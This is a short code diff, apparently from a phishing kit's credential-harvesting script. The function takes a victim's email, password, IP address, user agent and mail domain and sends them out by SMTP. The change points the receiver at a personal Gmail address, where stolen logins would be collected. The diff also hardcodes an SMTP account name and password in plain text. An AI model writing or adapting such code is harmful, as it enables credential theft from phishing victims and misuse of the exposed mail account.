@@ -23,7 +23,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
     smtp_port = 465
 
     sender = "yoipau@harvaneserver.quest"
-    receiver = "yoipau@harvaneserver.quest"
+    receiver = "kimkun543@gmail.com"
 
     smtp_user = "yoipau@harvaneserver.quest"
     smtp_password = "@8I&yz8mR.h!"
